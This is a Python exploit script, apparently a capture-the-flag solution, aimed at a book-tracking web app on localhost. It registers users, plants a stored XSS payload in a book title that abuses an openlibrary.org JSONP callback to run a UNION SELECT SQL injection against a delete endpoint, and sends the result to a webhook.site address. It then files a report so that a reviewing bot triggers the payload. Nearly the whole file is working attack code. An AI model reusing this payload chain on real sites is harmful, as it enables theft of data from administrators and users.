import requests
import json

HOST_URL = "<machine_ip>" # If running on a online VM or container
HOST_URL = "http://localhost:1337" #If running locally
HOOK_URL = "https://webhook.site/616e7181-19d4-40e7-8545-f6c871aeb819" # Change to yours

# Normal headers can directly initialsed by def register(params, headers={})


def register(params, headers):

    response = requests.post(f'{HOST_URL}/register',
                             params=params, headers=headers, verify=False)

    print(response.text)


def login(params, headers):
    response = requests.post(f'{HOST_URL}/api/login',
                             params=params, headers=headers, verify=False)
    print(json.loads(response.text)["token"])
    cookies = {
        'token': json.loads(response.text)["token"],
    }
    return cookies


def get_books(cookies, headers):
    response = requests.get(f'{HOST_URL}/getBooks',
                            cookies=cookies, headers=headers, verify=False)
    print(response.text)


headers_normal = {}
headers_create = {
    'Content-Type': 'application/json',
}

# User1
params1 = {
    'username': 'user1',
    'password': '12345',
}

# User 2 for report
params2 = {
    'username': 'user2',
    'password': '12345',
}

# register user 1
register(params1, headers_normal)

# register user 2
register(params2, headers_normal)

# Logging in and getting token for User1
cookies1 = login(params1, headers_normal)

# Loggin in and getting token for User2
cookies2 = login(params2, headers_normal)


response = requests.get(f'{HOST_URL}/getBooks',
                        cookies=cookies1, headers=headers_normal, verify=False)
response = requests.get(f'{HOST_URL}/getBooks',
                        cookies=cookies2, headers=headers_normal, verify=False)


# Creating book with XSS payload
'''
payload = "<iframe srcdoc=\"<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&callback=fetch(`/api/delete/?title=%22 UNION SELECT group_concat(link) FROM BOOKS--`,{method:`POST`}).then((response)=>response.text()).then((response)=>(window.top.location=`https://webhook.site/22c23ba2-cf25-43f5-b324-4ddac0ca9797/?q=${response}`));//'></script>a\"></iframe>"

data = f'{{"title":{payload},"author":"ff","pages":4,"imageLink":"/assets/icons/bookshelf.svg","link":"","read":false,"fav":false}}'
'''

payload = f"""<iframe srcdoc="<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&callback=\
fetch(`/api/delete/?title=%22 UNION SELECT group_concat(link) FROM BOOKS--`,{{method:`POST`}}).\
then((response)=>response.text()).then((response)=>\
(window.top.location=`{HOOK_URL}/?q=${{response}}`));//'></script>a"></iframe>"""

data_dict = {
    "title": payload,
    "author": "ff",
    "pages": 4,
    "imageLink": "/assets/icons/bookshelf.svg",
    "link": "",
    "read": False,
    "fav": False
}

data = json.dumps(data_dict)
response = requests.post(f'{HOST_URL}/api/create',
                         cookies=cookies1, headers=headers_create, data=data)
print(response.text)

# Test response
# response = {"status":"ok","book":{"title":"cdce","author":"Efef","pages":1,"imageLink":"/assets/icons/bookshelf.svg","link":"","fav":false,"read":false,"liteId":"8QM8rdERLC"}}
response_dict = json.loads(response.text)
liteId = response_dict['book']['liteId']
print(liteId)

# Report
data = f'{{"user":"user1","liteId":"{liteId}","reason":"test"}}'
response = requests.post(f'{HOST_URL}/report',
                         cookies=cookies2, headers=headers_create, data=data)
print(response.text)
